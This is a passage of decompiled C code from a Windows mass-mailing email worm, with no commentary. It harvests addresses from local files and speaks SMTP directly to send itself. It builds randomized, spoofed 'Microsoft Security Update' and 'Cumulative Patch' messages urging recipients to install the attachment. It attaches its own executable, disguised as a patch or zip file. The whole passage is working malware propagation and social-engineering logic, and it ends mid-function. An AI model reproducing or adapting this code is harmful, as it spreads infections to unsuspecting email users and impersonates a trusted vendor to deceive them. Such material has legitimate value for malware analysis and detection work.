char *__thiscall sub_401D8E(int *this, char *Destination, int a3)
{
  char *result; // eax
  int i; // eax
  int v5; // esi
  CHAR Source[80]; // [esp+14h] [ebp-6Ch] BYREF
  int v7; // [esp+64h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+68h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  result = Destination;
  *Destination = 0;
  if ( this[2] )
  {
    for ( i = *this; i; i = v5 )
    {
      v5 = *(_DWORD *)(i + 68);
      v7 = v5;
      if ( a3 )
        wsprintfA(Source, "RCPT TO: <%s>\r\n", i);
      else
        wsprintfA(Source, "HEAD %s\r\n", i);
      strcat(Destination, Source);
    }
    return Destination;
  }
  else
  {
    ms_exc.registration.TryLevel = -1;
  }
  return result;
}

//----- (00401E2D) --------------------------------------------------------
int sub_401E2D()
{
  char *v0; // eax
  char *v1; // eax
  unsigned int v2; // esi
  int FileSize; // ebx
  char *v4; // edi
  char *v5; // eax
  LONG v6; // eax
  char *v7; // eax
  unsigned int v8; // eax
  char *v9; // eax
  char *v10; // eax
  int v11; // eax
  char *v12; // eax
  char *v13; // eax
  char *v14; // eax
  char *v15; // edi
  char *v16; // eax
  char *v18; // [esp+1Ch] [ebp-1DCh]
  LONG DistanceToMoveHigh; // [esp+28h] [ebp-1D0h] BYREF
  unsigned int v20; // [esp+2Ch] [ebp-1CCh]
  char *v21; // [esp+30h] [ebp-1C8h]
  char v22[100]; // [esp+34h] [ebp-1C4h] BYREF
  DWORD v23; // [esp+98h] [ebp-160h]
  CHAR Destination[100]; // [esp+9Ch] [ebp-15Ch] BYREF
  unsigned int v25; // [esp+100h] [ebp-F8h]
  CHAR FileName[200]; // [esp+104h] [ebp-F4h] BYREF
  HANDLE hFile; // [esp+1CCh] [ebp-2Ch]
  DWORD FileSizeHigh; // [esp+1D0h] [ebp-28h] BYREF
  int v29; // [esp+1D4h] [ebp-24h]
  char *v30; // [esp+1D8h] [ebp-20h]
  int v31; // [esp+1DCh] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+1E0h] [ebp-18h]

  v29 = 1;
  ms_exc.registration.TryLevel = 0;
  strcpy(FileName, Buffer);
  v0 = strcat(FileName, aGerms0Dbv);
  hFile = CreateFileA(v0, 0xC0000000, 3u, 0, 3u, 0, 0);
  if ( hFile == (HANDLE)-1 )
  {
    strcpy(FileName, Buffer);
    v1 = strcat(FileName, aGerms1Dbv);
    hFile = CreateFileA(v1, 0xC0000000, 3u, 0, 3u, 0, 0);
    v29 = 0;
  }
  if ( hFile == (HANDLE)-1 )
  {
    sub_405108();
    sub_402374(0, 0);
  }
  else
  {
    v20 = 0;
    v2 = sub_406850(0x1Eu) + 50;
    v25 = v2;
    FileSize = GetFileSize(hFile, &FileSizeHigh);
    v31 = FileSize;
    v4 = (char *)operator new(FileSize + 2);
    v30 = v4;
    ReadFile(hFile, v4, FileSize, &FileSizeHigh, 0);
    v4[FileSizeHigh] = 0;
    sub_401BE7(&dword_41A818);
    while ( 1 )
    {
      if ( v20 >= v2 )
        goto LABEL_14;
      v5 = strrchr(v4, 58);
      v21 = v5;
      if ( !v5 )
        break;
      if ( sub_401B22((char **)&dword_41A818, v5 + 1, 1) )
        ++v20;
      *v21 = 0;
    }
    if ( v20 >= v2 )
    {
LABEL_14:
      DistanceToMoveHigh = 0;
      v6 = strlen(v4);
      SetFilePointer(hFile, v6, &DistanceToMoveHigh, 0);
      SetEndOfFile(hFile);
      CloseHandle(hFile);
      goto LABEL_15;
    }
    CloseHandle(hFile);
    DeleteFileA(FileName);
    if ( !v20 )
    {
      sub_402374(0, 0);
      return 0;
    }
LABEL_15:
    operator delete(v4);
    v30 = 0;
    sub_401B15(dword_412F48, 1);
    sub_4018D3((int)dword_412F48);
    if ( (sub_401946((int)dword_412F48, (char *)&cp, 0x19u, hWnd)
       || sub_401946((int)dword_412F48, (char *)&cp, 0x19u, hWnd))
      && WaitForSingleObject(hObject, 0x2710u) != 258 )
    {
      v7 = sub_401830((int)dword_412F48, Destination, 3u);
      if ( !strcmp(v7, a220) )
      {
        v8 = sub_406850(5u);
        sub_4068F4((int)v22, v8 + 3);
        wsprintfA(Destination, "HELO %s\r\n", v22);
        sub_401A9E(dword_412F48, Destination);
        if ( sub_401B0D(dword_412F48) )
        {
          if ( WaitForSingleObject(hObject, 0x1B58u) != 258 )
          {
            v9 = sub_401830((int)dword_412F48, Destination, 3u);
            if ( !strcmp(v9, a250) )
            {
              wsprintfA(Destination, "MAIL FROM: <%s>\r\n", (const char *)&Data);
              sub_401A9E(dword_412F48, Destination);
              if ( sub_401B0D(dword_412F48) )
              {
                if ( WaitForSingleObject(hObject, 0x1B58u) != 258 )
                {
                  v10 = sub_401830((int)dword_412F48, Destination, 3u);
                  if ( !strcmp(v10, a250) )
                  {
                    sub_401B15(dword_412F48, v20);
                    v11 = sub_401D8A(&dword_41A818);
                    v18 = (char *)operator new(77 * v11);
                    v30 = v18;
                    v12 = sub_401D8E(&dword_41A818, v18, 1);
                    sub_401A9E(dword_412F48, v12);
                    operator delete(v18);
                    if ( sub_401B0D(dword_412F48) )
                    {
                      if ( WaitForSingleObject(hObject, 800 * v20 + 6000) != 258 )
                      {
                        sub_401830((int)dword_412F48, Destination, 4u);
                        sub_401B15(dword_412F48, 1);
                        sub_401A9E(dword_412F48, buf);
                        if ( sub_401B0D(dword_412F48) )
                        {
                          if ( WaitForSingleObject(hObject, 0x1B58u) != 258 )
                          {
                            v13 = sub_401830((int)dword_412F48, Destination, 3u);
                            if ( !strcmp(v13, a354) )
                            {
                              v14 = (char *)operator new(0x2BF20u);
                              v15 = v14;
                              v30 = v14;
                              if ( v29 )
                                sub_402478(v14, 1, 0);
                              else
                                sub_403763(v14);
                              sub_401A9E(dword_412F48, v15);
                              if ( !sub_401B0D(dword_412F48) )
                              {
                                operator delete(v15);
                                sub_402374(1, v29);
                                return 0;
                              }
                              v23 = WaitForSingleObject(hObject, 0x30D40u);
                              operator delete(v15);
                              if ( v23 != 258 )
                              {
                                v16 = sub_401830((int)dword_412F48, Destination, 3u);
                                if ( !strcmp(v16, a250) )
                                {
                                  sub_401A9E(dword_412F48, aQuit);
                                  Sleep(0x3E8u);
                                  sub_402374(0, v29);
                                  return 0;
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    sub_402374(1, v29);
  }
  return 0;
}
// 412F48: using guessed type SOCKET dword_412F48[7546];
// 41A818: using guessed type int dword_41A818;

//----- (00402374) --------------------------------------------------------
void __cdecl sub_402374(int a1, int a2)
{
  char Destination[100]; // [esp+Ch] [ebp-7Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+70h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  sub_4018D3((int)dword_412F48);
  if ( a1 || a2 )
  {
    strcpy(Destination, Buffer);
    if ( a1 && a2 )
      strcat(Destination, aGerms0Dbv);
    else
      strcat(Destination, aGerms1Dbv);
    sub_401C5A(&dword_41A818, Destination);
  }
  sub_401BE7(&dword_41A818);
  dword_41A59C = 0;
}
// 412F48: using guessed type SOCKET dword_412F48[7546];
// 41A59C: using guessed type int dword_41A59C;
// 41A818: using guessed type int dword_41A818;

//----- (00402425) --------------------------------------------------------
char *__cdecl sub_402425(char *Destination, __int16 a2)
{
  HMODULE ModuleHandleA; // esi
  HRSRC ResourceA; // edi
  DWORD v4; // ebx
  char *result; // eax
  char *v6; // esi

  ModuleHandleA = GetModuleHandleA(0);
  ResourceA = FindResourceA(ModuleHandleA, (LPCSTR)(unsigned __int16)a2, Type);
  v4 = SizeofResource(ModuleHandleA, ResourceA);
  result = (char *)LoadResource(0, ResourceA);
  v6 = result;
  if ( result )
  {
    strncat(Destination, result, v4);
    return (char *)FreeResource(v6);
  }
  return result;
}

//----- (00402478) --------------------------------------------------------
char *__cdecl sub_402478(char *Str, int a2, char *a3)
{
  unsigned int v3; // eax
  unsigned int v4; // eax
  unsigned int v5; // eax
  bool v6; // zf
  const char *v7; // eax
  unsigned int v8; // eax
  unsigned int v9; // eax
  unsigned int v10; // eax
  unsigned int v11; // eax
  unsigned int v12; // eax
  unsigned int v13; // eax
  unsigned int v14; // eax
  unsigned int v15; // eax
  unsigned int v16; // eax
  unsigned int v17; // eax
  unsigned int v18; // eax
  unsigned int v19; // eax
  const char *v20; // eax
  unsigned int v21; // eax
  const char *v22; // eax
  unsigned int v23; // eax
  const char *v24; // eax
  unsigned int v25; // eax
  const char *v26; // eax
  unsigned int v27; // eax
  unsigned int v28; // eax
  unsigned int v29; // eax
  const char *v30; // eax
  unsigned int v31; // eax
  const char *v32; // eax
  unsigned int v33; // eax
  unsigned int v34; // eax
  unsigned int v35; // eax
  const char *v36; // eax
  unsigned int v37; // eax
  unsigned int v38; // eax
  unsigned int v39; // eax
  unsigned int v40; // eax
  const char *v41; // eax
  unsigned int v42; // eax
  unsigned int v43; // eax
  unsigned int v44; // eax
  unsigned int v45; // eax
  unsigned int v46; // eax
  unsigned int v47; // eax
  unsigned int v48; // eax
  unsigned int v49; // eax
  unsigned int v50; // eax
  unsigned int v51; // eax
  unsigned int v52; // eax
  unsigned int v53; // eax
  unsigned int v54; // eax
  unsigned int v55; // eax
  unsigned int v56; // eax
  unsigned int v57; // eax
  unsigned int v58; // eax
  unsigned int v59; // eax
  unsigned int v60; // eax
  unsigned int v61; // eax
  unsigned int v62; // eax
  unsigned int v63; // eax
  unsigned int v64; // eax
  const char *v65; // eax
  const char *v66; // eax
  const char *v67; // eax
  const char *v68; // eax
  unsigned int v69; // eax
  unsigned int v70; // eax
  const char *v71; // eax
  const char *v72; // eax
  char *j; // eax
  BOOL v74; // ebx
  const char *v75; // eax
  unsigned int v76; // eax
  const char *v77; // eax
  const char *v78; // eax
  char SubStr[8]; // [esp+Ch] [ebp-548h] BYREF
  char *v81; // [esp+14h] [ebp-540h]
  char v82[8]; // [esp+18h] [ebp-53Ch] BYREF
  __int16 v83[2]; // [esp+20h] [ebp-534h]
  BOOL v84; // [esp+24h] [ebp-530h]
  struct _SYSTEMTIME SystemTime; // [esp+28h] [ebp-52Ch] BYREF
  char Source[32]; // [esp+38h] [ebp-51Ch] BYREF
  char v87[800]; // [esp+58h] [ebp-4FCh] BYREF
  CHAR sz[52]; // [esp+378h] [ebp-1DCh] BYREF
  char Destination[32]; // [esp+3ACh] [ebp-1A8h] BYREF
  int i; // [esp+3CCh] [ebp-188h]
  CHAR Buffer[300]; // [esp+3D0h] [ebp-184h] BYREF
  char v92[20]; // [esp+4FCh] [ebp-58h] BYREF
  char v93[20]; // [esp+510h] [ebp-44h] BYREF
  char v94[20]; // [esp+524h] [ebp-30h] BYREF
  DWORD pcbBuffer; // [esp+538h] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+53Ch] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  *Str = 0;
  Destination[0] = 0;
  Buffer[0] = 0;
  sz[0] = 0;
  v3 = sub_406850(0xAu);
  sub_4068F4((int)v93, v3 + 7);
  v4 = sub_406850(0xAu);
  sub_4068F4((int)v92, v4 + 7);
  v5 = sub_406850(0xAu);
  sub_4068F4((int)v94, v5 + 7);
  strcat(Str, aFrom);
  if ( !a2 )
  {
    if ( byte_412DD8[0] )
    {
      strcpy(Buffer, (const char *)byte_412DD8);
    }
    else
    {
      pcbBuffer = 300;
      if ( !GetUserNameA(Buffer, &pcbBuffer) )
      {
        pcbBuffer = 300;
        if ( !GetComputerNameA(Buffer, &pcbBuffer) )
          strcpy(Buffer, aUnknown);
      }
    }
    goto LABEL_47;
  }
  if ( sub_406840(0x50u) )
  {
    v6 = !sub_406840(0x32u);
    v7 = aMs;
    if ( v6 )
      v7 = aMicrosoft;
    strcat(Buffer, v7);
    if ( sub_406840(0x32u) )
      strcat(Buffer, aCorporation);
  }
  if ( sub_406840(0x32u) )
  {
    v8 = sub_406850(4u) - 1;
    if ( v8 )
    {
      v9 = v8 - 1;
      if ( v9 )
      {
        if ( v9 == 1 )
          strcat(Buffer, aProgram);
      }
      else
      {
        strcat(Buffer, aInternet);
      }
    }
    else
    {
      strcat(Buffer, aNetwork);
    }
    strcat(Buffer, aSecurity);
    v10 = sub_406850(4u) - 1;
    if ( v10 )
    {
      v11 = v10 - 1;
      if ( v11 )
      {
        v12 = v11 - 1;
        if ( v12 )
        {
          if ( v12 == 1 )
            strcat(Buffer, aDivision);
        }
        else
        {
          strcat(Buffer, aSection);
        }
      }
      else
      {
        strcat(Buffer, aDepartment);
      }
    }
    else
    {
      strcat(Buffer, aCenter);
    }
  }
  else
  {
    v13 = sub_406850(4u) - 1;
    if ( v13 )
    {
      v14 = v13 - 1;
      if ( v14 )
      {
        v15 = v14 - 1;
        if ( v15 )
        {
          if ( v15 == 1 )
            strcat(Buffer, aSecurity);
        }
        else
        {
          strcat(Buffer, aTechnical);
        }
      }
      else
      {
        strcat(Buffer, aPublic);
      }
    }
    else
    {
      strcat(Buffer, aCustomer);
    }
    v16 = sub_406850(4u) - 1;
    if ( v16 )
    {
      v17 = v16 - 1;
      if ( v17 )
      {
        v18 = v17 - 1;
        if ( v18 )
        {
          if ( v18 == 1 )
            strcat(Buffer, aBulletin);
        }
        else
        {
          strcat(Buffer, aServices);
        }
      }
      else
      {
        strcat(Buffer, aAssistance);
      }
    }
    else
    {
      strcat(Buffer, aSupport);
    }
  }
  if ( sub_406840(9u) )
    strcpy(Buffer, aMicrosoft_0);
  if ( sub_406840(0x61u) )
LABEL_47:
    strcat(Str, Buffer);
  strcat(Str, asc_410D30);
  v19 = sub_406850(0xAu);
  sub_4068F4((int)Buffer, v19 + 5);
  if ( sub_406840(0x32u) )
  {
    v6 = !sub_406840(0x32u);
    v20 = asc_410D2C;
    if ( v6 )
      v20 = asc_410D28;
    strcat(Buffer, v20);
    v21 = sub_406850(5u);
    v22 = (const char *)sub_4068F4((int)sz, v21 + 3);
    strcat(Buffer, v22);
  }
  strcat(Buffer, asc_410D24);
  if ( a2 )
  {
    switch ( sub_406850(9u) )
    {
      case 1u:
        strcpy(Destination, aNewsletters);
        break;
      case 2u:
        strcpy(Destination, aSupport_0);
        break;
      case 3u:
        strcpy(Destination, aTechnet);
        break;
      case 4u:
        strcpy(Destination, aUpdates);
        break;
      case 5u:
        strcpy(Destination, aAdvisor);
        break;
      case 6u:
        strcpy(Destination, aConfidence);
        break;
      case 7u:
        strcpy(Destination, aBulletin_0);
        break;
      case 8u:
        strcpy(Destination, aNews);
        break;
      case 9u:
        v23 = sub_406850(5u);
        v24 = (const char *)sub_4068F4((int)sz, v23 + 3);
        strcpy(Destination, v24);
        break;
      default:
        break;
    }
  }
  else
  {
    v25 = sub_406850(3u);
    sub_4068F4((int)Destination, v25 + 2);
  }
  if ( sub_406840(0x41u) && a2 )
  {
    v6 = !sub_406840(0x50u);
    v26 = asc_410CD4;
    if ( v6 )
      v26 = asc_410D2C;
    strcat(Destination, v26);
    v27 = sub_406850(4u) - 1;
    if ( v27 )
    {
      v28 = v27 - 1;
      if ( v28 )
      {
        v29 = v28 - 1;
        if ( v29 )
        {
          if ( v29 == 1 )
            strcat(Destination, aMsn);
        }
        else
        {
          strcat(Destination, aMs_0);
        }
      }
      else
      {
        strcat(Destination, aMicrosoft_1);
      }
    }
    else
    {
      strcat(Destination, aMsdn);
    }
  }
  v6 = !sub_406840(0x46u);
  v30 = aCom;
  if ( v6 )
    v30 = aNet;
  strcat(Destination, v30);
  strcat(Buffer, Destination);
  if ( sub_406840(7u) )
    strcpy(Buffer, " ");
  strcat(Str, Buffer);
  if ( a2 )
    strcat(Str, aTo);
  else
    strcat(Str, aNewsgroups);
  Buffer[0] = 0;
  v31 = sub_406850(3u) - 1;
  if ( v31 )
  {
    if ( v31 == 1 && sub_406840(0x50u) )
      strcat(Buffer, aCommercial);
  }
  else
  {
    v6 = !sub_406840(0x32u);
    v32 = aMs;
    if ( v6 )
      v32 = aMicrosoft;
    strcat(Buffer, v32);
    if ( sub_406840(0x28u) )
      strcat(Buffer, aCorporation);
  }
  if ( sub_406840(0x25u) )
  {
    strcpy(Source, aCustomer_0);
  }
  else
  {
    v33 = sub_406850(4u) - 1;
    if ( v33 )
    {
      v34 = v33 - 1;
      if ( v34 )
      {
        v35 = v34 - 1;
        if ( v35 )
        {
          if ( v35 == 1 )
            strcpy(Source, aUser);
        }
        else
        {
          strcpy(Source, aPartner);
        }
      }
      else
      {
        strcpy(Source, aConsumer);
      }
    }
    else
    {
      strcpy(Source, aClient);
    }
  }
  strcat(Buffer, Source);
  if ( sub_406840(6u) )
    strcpy(Buffer, " ");
  if ( !a2 && a3 )
    strcpy(Buffer, a3);
  strcat(Str, Buffer);
  if ( a2 )
  {
    strcat(Str, asc_410D30);
    Buffer[0] = 0;
    if ( sub_406840(0x32u) )
    {
      v36 = Source;
    }
    else
    {
      v37 = sub_406850(5u);
      v36 = (const char *)sub_4068F4((int)sz, v37 + 3);
    }
    strcat(Buffer, v36);
    if ( sub_406840(0x50u) )
    {
      v38 = sub_406850(3u) - 1;
      if ( v38 )
      {
        v39 = v38 - 1;
        if ( v39 )
        {
          if ( v39 == 1 )
            strcat(Buffer, asc_410D28);
        }
        else
        {
          strcat(Buffer, asc_410D2C);
        }
      }
      else
      {
        strcat(Buffer, asc_410CD4);
      }
      v40 = sub_406850(5u);
      v41 = (const char *)sub_4068F4((int)sz, v40 + 5);
      strcat(Buffer, v41);
    }
    strcat(Buffer, asc_410D24);
    strcat(Buffer, Destination);
    CharLowerA(Buffer);
    if ( sub_406840(5u) )
      strcpy(Buffer, " ");
    strcat(Str, Buffer);
    strcat(Str, asc_410C4C);
  }
  strcat(Str, aSubject);
  Buffer[0] = 0;
  if ( a2 )
  {
    v42 = sub_406850(6u) - 1;
    if ( v42 )
    {
      v43 = v42 - 1;
      if ( v43 )
      {
        v44 = v43 - 1;
        if ( v44 )
        {
          v45 = v44 - 1;
          if ( v45 )
          {
            if ( v45 == 1 )
              strcat(Buffer, aCurrent);
          }
          else
          {
            strcat(Buffer, aNewest);
          }
        }
        else
        {
          strcat(Buffer, aLast);
        }
      }
      else
      {
        strcat(Buffer, aNew);
      }
    }
    else
    {
      strcat(Buffer, aLatest);
    }
    v46 = sub_406850(5u) - 1;
    if ( v46 )
    {
      v47 = v46 - 1;
      if ( v47 )
      {
        v48 = v47 - 1;
        if ( v48 )
        {
          if ( v48 == 1 )
            strcat(Buffer, aNet_0);
        }
        else
        {
          strcat(Buffer, aNetwork);
        }
      }
      else
      {
        strcat(Buffer, aMicrosoft);
      }
    }
    else
    {
      strcat(Buffer, aInternet);
    }
    v49 = sub_406850(3u) - 1;
    if ( v49 )
    {
      if ( v49 == 1 )
        strcat(Buffer, aCritical);
    }
    else
    {
      strcat(Buffer, aSecurity);
    }
    v50 = sub_406850(4u) - 1;
    if ( v50 )
    {
      v51 = v50 - 1;
      if ( v51 )
      {
        v52 = v51 - 1;
        if ( v52 )
        {
          if ( v52 == 1 )
            strcat(Buffer, aPatch);
        }
        else
        {
          strcat(Buffer, aUpdate);
        }
      }
      else
      {
        strcat(Buffer, aPack);
      }
    }
    else
    {
      strcat(Buffer, aUpgrade);
    }
    if ( sub_406840(7u) )
      CharLowerA(Buffer);
    if ( sub_406840(5u) )
      strcpy(Buffer, " ");
    goto LABEL_231;
  }
  v53 = sub_406850(0xCu) - 1;
  if ( v53 )
  {
    v54 = v53 - 1;
    if ( v54 )
    {
      if ( v54 == 1 )
        strcat(Buffer, aRe);
    }
    else
    {
      strcat(Buffer, aFwd);
    }
  }
  else
  {
    strcat(Buffer, aFw);
  }
  switch ( sub_406850(0xDu) )
  {
    case 1u:
      strcat(Buffer, aCheck);
      break;
    case 2u:
      strcat(Buffer, aCheckOut);
      break;
    case 3u:
      strcat(Buffer, aProve);
      break;
    case 4u:
      strcat(Buffer, aTaste);
      break;
    case 5u:
      strcat(Buffer, aTry);
      break;
    case 6u:
      strcat(Buffer, aTryOn);
      break;
    case 7u:
      strcat(Buffer, aLookAt);
      break;
    case 8u:
      strcat(Buffer, aTakeALookAt);
      break;
    case 9u:
      strcat(Buffer, aSee);
      break;
    case 0xAu:
      strcat(Buffer, aWatch);
      break;
    case 0xBu:
      strcat(Buffer, aUse);
      break;
    case 0xCu:
      strcat(Buffer, aApply);
      break;
    case 0xDu:
      strcat(Buffer, aInstall);
      break;
    default:
      break;
  }
  if ( sub_406840(0x28u) )
  {
    strcat(Buffer, aThis);
  }
  else
  {
    v55 = sub_406850(4u) - 1;
    if ( v55 )
    {
      v56 = v55 - 1;
      if ( v56 )
      {
        if ( v56 == 1 )
          strcat(Buffer, aThat);
      }
      else
      {
        strcat(Buffer, aThe);
      }
    }
    else
    {
      strcat(Buffer, aThese);
    }
  }
  v57 = sub_406850(7u) - 1;
  if ( v57 )
  {
    v58 = v57 - 1;
    if ( v58 )
    {
      v59 = v58 - 1;
      if ( v59 )
      {
        v60 = v59 - 1;
        if ( v60 )
        {
          v61 = v60 - 1;
          if ( v61 )
          {
            if ( v61 == 1 )
              strcat(Buffer, aImportant);
          }
          else
          {
            strcat(Buffer, aInternet_0);
          }
        }
        else
        {
          strcat(Buffer, aCritical_0);
        }
      }
      else
      {
        strcat(Buffer, aSecurity_0);
      }
    }
    else
    {
      strcat(Buffer, aCorrective);
    }
  }
  else
  {
    strcat(Buffer, aCorrection);
  }
  v62 = sub_406850(4u) - 1;
  if ( v62 )
  {
    v63 = v62 - 1;
    if ( v63 )
    {
      v64 = v63 - 1;
      if ( v64 )
      {
        if ( v64 == 1 )
          strcat(Buffer, aPack_0);
      }
      else
      {
        strcat(Buffer, aPackage);
      }
    }
    else
    {
      strcat(Buffer, aPatch_0);
    }
  }
  else
  {
    strcat(Buffer, aUpdate_0);
  }
  if ( sub_406840(0x3Cu) )
  {
    strcat(Buffer, Caption);
    if ( sub_406840(0x14u) )
    {
      strcat(Buffer, aFor);
      if ( sub_406840(0x32u) )
      {
        v6 = !sub_406840(0x41u);
        v65 = aMicrosoft;
        if ( v6 )
          v65 = aMs;
        strcat(Buffer, v65);
      }
      v6 = !sub_406840(0x32u);
      v66 = aWindows;
      if ( v6 )
        v66 = aInternetExplor;
LABEL_230:
      strcat(Buffer, v66);
      goto LABEL_231;
    }
    if ( sub_406840(0x1Eu) )
    {
      v6 = !sub_406840(0x32u);
      v67 = aWhich;
      if ( v6 )
        v67 = aThat;
      strcat(Buffer, v67);
      v6 = !sub_406840(0x32u);
      v68 = aCame;
      if ( v6 )
        v68 = aComes;
      strcat(Buffer, v68);
    }
    strcat(Buffer, aFrom_0);
    if ( sub_406840(0x3Cu) )
      strcat(Buffer, aThe);
    v69 = sub_406850(3u) - 1;
    if ( v69 )
    {
      v70 = v69 - 1;
      if ( v70 )
      {
        if ( v70 == 1 )
          strcat(Buffer, aMs_1);
      }
      else
      {
        strcat(Buffer, aMicrosoft_0);
      }
    }
    else
    {
      strcat(Buffer, aM);
    }
    if ( sub_406840(0x3Cu) )
    {
      v6 = !sub_406840(0x3Cu);
      v66 = aCorporation_0;
      if ( v6 )
        v66 = aCorp;
      goto LABEL_230;
    }
  }
LABEL_231:
  strcat(Str, Buffer);
  if ( dword_41A6D8 )
  {
    strcat(Str, aXId);
    strcat(Str, (const char *)&byte_412E74);
  }
  strcat(Str, aMimeVersion10C);
  strcat(Str, v93);
  strcat(Str, asc_410A0C);
  strcat(Str, v93);
  strcat(Str, aContentTypeMul);
  strcat(Str, v92);
  strcat(Str, aTypeMultipartA);
  strcat(Str, v92);
  strcat(Str, aContentTypeMul_0);
  strcat(Str, v94);
  strcat(Str, asc_410A0C);
  strcat(Str, v94);
  strcat(Str, aContentTypeTex);
  Buffer[0] = 0;
  v6 = !sub_406840(0x46u);
  v71 = aMicrosoft;
  if ( v6 )
    v71 = aMs;
  strcat(Buffer, v71);
  strcat(Buffer, Source);
  strcpy(Source, Buffer);
  strcat(Str, Source);
  strcat(Str, asc_41092C);
  GetSystemTime(&SystemTime);
  sub_4034D6(v87, SystemTime.wMonth, SystemTime.wYear);
  strcat(Str, v87);
  if ( sub_406840(0x50u) )
    sub_402425(Str, 120);
  if ( sub_406840(0x55u) )
  {
    sub_402425(Str, 121);
    if ( sub_406840(0x46u) )
    {
      wsprintfA(Buffer, "Copyright %i Microsoft Corporation.\r\n", SystemTime.wYear);
      strcat(Str, Buffer);
    }
  }
  strcat(Str, asc_4108FC);
  strcat(Str, v94);
  strcat(Str, aContentTypeTex_0);
  sub_402425(Str, 111);
  strcat(Str, Source);
  strcat(Str, aBrBr);
  strcat(Str, v87);
  sub_402425(Str, 112);
  wsprintfA(sz, "%i", SystemTime.wYear);
  strcat(Str, sz);
  sub_402425(Str, 113);
  strcat(Str, asc_410898);
  strcat(Str, v94);
  strcat(Str, asc_410894);
  for ( i = 0; i < 2; ++i )
  {
    strcat(Str, asc_410898);
    strcat(Str, v92);
    strcat(Str, aContentTypeIma);
    if ( i )
    {
      if ( i == 1 )
      {
        strcat(Str, a6447821);
        *(_DWORD *)v83 = 115;
      }
    }
    else
    {
      strcat(Str, a5897421);
      *(_DWORD *)v83 = 114;
    }
    strcat(Str, asc_410830);
    sub_402425(Str, v83[0]);
  }
  for ( i = 0; i < 2; ++i )
  {
    v81 = Str;
    sub_4068F4((int)v82, 7u);
    v72 = a5897421;
    if ( i )
      v72 = a6447821;
    strcpy(SubStr, v72);
    for ( j = strstr(Str, SubStr); ; j = strstr(v81, SubStr) )
    {
      v81 = j;
      if ( !j )
        break;
      strncpy(v81++, v82, 7u);
    }
  }
  strcat(Str, asc_410898);
  strcat(Str, v92);
  strcat(Str, asc_410824);
  strcat(Str, v93);
  v74 = !a2 && byte_412F38[0];
  v84 = v74;
  strcat(Str, aContentTypeApp);
  v75 = aCompressed;
  if ( !v74 )
    v75 = aMsdownload;
  strcat(Str, v75);
  strcat(Str, aName);
  if ( v74 && sub_406840(0x19u) )
  {
    v76 = sub_406850(4u);
    v77 = (const char *)sub_4068F4((int)sz, v76 + 2);
    strcat(Str, v77);
  }
  else
  {
    v78 = sub_4073F8(sz);
    strcat(Str, v78);
  }
  if ( v74 )
  {
    strcat(Str, aZip);
    wsprintfA(Buffer, "%s\\%s", ::Buffer, (const char *)byte_412F38);
  }
  else
  {
    strcat(Str, aExe);
    GetModuleFileNameA(0, Buffer, 0x12Cu);
  }
  strcat(Str, aContentTransfe);
  sub_404411(Str, Buffer);
  strcat(Str, asc_410898);
  strcat(Str, v93);
  return strcat(Str, asc_410770);
}
// 412DD8: using guessed type BYTE byte_412DD8[52];
// 412F38: using guessed type BYTE byte_412F38[16];
// 41A6D8: using guessed type int dword_41A6D8;

//----- (004034D6) --------------------------------------------------------
char *__cdecl sub_4034D6(char *Destination, __int16 a2, __int16 a3)
{
  unsigned int v3; // eax
  unsigned int v4; // eax
  bool v5; // zf
  const char *v6; // eax
  const char *v7; // eax
  const char *v8; // eax
  const char *v9; // eax
  const char *v10; // eax
  CHAR Source[52]; // [esp+4h] [ebp-34h] BYREF

  *Destination = 0;
  strcat(Destination, aThisIsTheLates);
  switch ( a2 )
  {
    case 1:
      strcat(Destination, aJanuary);
      break;
    case 2:
      strcat(Destination, aFebruary);
      break;
    case 3:
      strcat(Destination, aMarch);
      break;
    case 4:
      strcat(Destination, aApril);
      break;
    case 5:
      strcat(Destination, aMay);
      break;
    case 6:
      strcat(Destination, aJune);
      break;
    case 7:
      strcat(Destination, aJuly);
      break;
    case 8:
      strcat(Destination, aAugust);
      break;
    case 9:
      strcat(Destination, aSeptember);
      break;
    case 10:
      strcat(Destination, aOctober);
      break;
    case 11:
      strcat(Destination, aNovember);
      break;
    case 12:
      strcat(Destination, aDecember);
      break;
    default:
      break;
  }
  wsprintfA(Source, " %i, Cumulative Patch\" update which ", (unsigned __int16)a3);
  strcat(Destination, Source);
  v3 = sub_406850(3u) - 1;
  if ( v3 )
  {
    v4 = v3 - 1;
    if ( v4 )
    {
      if ( v4 == 1 )
        strcat(Destination, aFixes);
    }
    else
    {
      strcat(Destination, aResolves);
    }
  }
  else
  {
    strcat(Destination, aEliminates);
  }
  strcat(Destination, aAllKnownSecuri);
  if ( sub_406840(0x46u) )
  {
    strcat(Destination, aAsWellAsThree);
    v5 = !sub_406840(0x46u);
    v6 = aNewlyDiscovere;
    if ( v5 )
      v6 = aNew_0;
    strcat(Destination, v6);
    strcat(Destination, aVulnerabilitie);
  }
  strcat(Destination, aInstallNowTo);
  if ( sub_406840(0x14u) )
  {
    strcat(Destination, aContinueKeepin);
  }
  else
  {
    if ( sub_406840(0x28u) )
      strcat(Destination, aHelp);
    v5 = !sub_406840(0x3Cu);
    v7 = aProtectYourCom;
    if ( v5 )
      v7 = aMaintainTheSec;
    strcat(Destination, v7);
  }
  if ( sub_406840(0x55u) )
  {
    strcat(Destination, aFromTheseVulne);
    if ( sub_406840(0x50u) )
    {
      strcat(Destination, aTheMostSerious);
      v5 = !sub_406840(0x41u);
      v8 = aAttacker;
      if ( v5 )
        v8 = aMaliciousUser;
      strcat(Destination, v8);
      strcat(Destination, aToRun);
      v5 = !sub_406840(0x32u);
      v9 = aExecutable;
      if ( v5 )
        v9 = aCode;
      strcat(Destination, v9);
      strcat(Destination, aOnYour);
      v5 = !sub_406840(0x28u);
      v10 = aSystem;
      if ( v5 )
        v10 = aComputer;
      strcat(Destination, v10);
    }
  }
  strcat(Destination, asc_410CD4);
  if ( sub_406840(0x5Fu) )
    strcat(Destination, aThisUpdateIncl);
  return strcat(Destination, asc_4106F0);
}

//----- (00403763) --------------------------------------------------------
char *__cdecl sub_403763(char *Destination)
{
  unsigned int v1; // eax
  unsigned int v2; // eax
  unsigned int v3; // eax
  bool v4; // zf
  const char *v5; // eax
  unsigned int v6; // eax
  unsigned int v7; // eax
